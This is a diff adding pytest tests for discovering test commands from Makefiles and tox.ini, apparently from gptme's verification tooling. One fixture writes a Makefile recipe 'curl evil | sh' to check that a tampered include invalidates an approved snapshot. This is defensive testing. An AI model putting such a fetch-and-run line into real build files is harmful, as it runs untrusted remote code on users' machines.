@@ -504,3 +504,61 @@ def test_cleanup_ignores_child_rewritten_bound_paths(tmp_path: Path) -> None:
     restore_approved_snapshots(bind)
     assert victim.exists()
     assert not Path(argv[2]).exists()
+
+
+def test_included_makefile_edit_after_approval_is_stale(tmp_path: Path) -> None:
+    from gptme.util.completion_verification import unsnapshotted_sources_match
+
+    (tmp_path / "Makefile").write_text("test:\n\t@true\n")
+    (tmp_path / "GNUmakefile").write_text("include Makefile\n")
+    command = discover_verification_command(tmp_path)
+    assert command is not None
+    assert unsnapshotted_sources_match(command)
+    # make reads the include live, outside the approved GNUmakefile snapshot.
+    (tmp_path / "Makefile").write_text("test:\n\t@curl evil | sh\n")
+    assert not unsnapshotted_sources_match(command)
+
+
+def test_recipe_line_calling_include_is_not_an_include(tmp_path: Path) -> None:
+    (tmp_path / "Makefile").write_text("all:\n\tinclude tests.mk\n")
+    (tmp_path / "tests.mk").write_text("test:\n\t@true\n")
+    assert discover_verification_command(tmp_path) is None
+
+
+def test_make_include_symlink_loop_is_skipped(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    (tmp_path / "GNUmakefile").write_text("include loop.mk tests.mk\n")
+    (tmp_path / "loop.mk").write_text("")
+    (tmp_path / "tests.mk").write_text("test:\n\t@true\n")
+    real_resolve = Path.resolve
+
+    def resolve(self: Path, strict: bool = False) -> Path:
+        if self.name == "loop.mk":
+            raise RuntimeError("Symlink loop")  # Python < 3.13
+        return real_resolve(self, strict=strict)
+
+    monkeypatch.setattr(Path, "resolve", resolve)
+    command = discover_verification_command(tmp_path)
+    assert command is not None
+    assert (
+        command.reason == "GNUmakefile includes tests.mk, which defines a test target"
+    )
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "[testenv]\ncommands_pre = python -m pytest\n",
+        "[testenv]\ncommands_post = python -m pytest\n",
+        "[testenv]\ncommands = pytest\n[testenv:py]\ncommands_pre = ruff check .\n",
+    ],
+    ids=["pre-only", "post-only", "py-overrides-pre"],
+)
+def test_tox_ini_default_env_with_any_command_key_is_discovered(
+    tmp_path: Path, text: str
+) -> None:
+    (tmp_path / "tox.ini").write_text(text)
+    command = discover_verification_command(tmp_path)
+    assert command is not None
+    assert command.argv[:1] == ("tox",)
